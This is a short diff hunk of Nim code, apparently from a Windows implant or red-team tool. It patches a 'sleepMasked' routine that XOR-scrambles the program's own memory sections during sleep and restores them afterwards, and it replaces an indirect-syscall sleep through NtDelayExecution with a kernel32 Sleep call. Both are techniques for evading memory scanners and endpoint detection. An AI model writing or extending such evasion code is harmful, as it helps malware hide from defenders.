@@ -106,8 +106,9 @@ proc sleepMasked*(ms: int) =
     for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
     discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READONLY, addr old)
 
-  # Sleep via indirect syscall — NtDelayExecution runs from ntdll, not our .text.
-  sleepViaNt(ms)
+  # Use kernel32 Sleep (resolved via .idata which is NOT XOR'd) so the call
+  # works even though .data globals like stubDelayExec are now XOR-scrambled.
+  Sleep(DWORD(ms))
 
   # Pass 2: XOR-decrypt and restore protection for masked sections.
   for i in 0 ..< nsec:
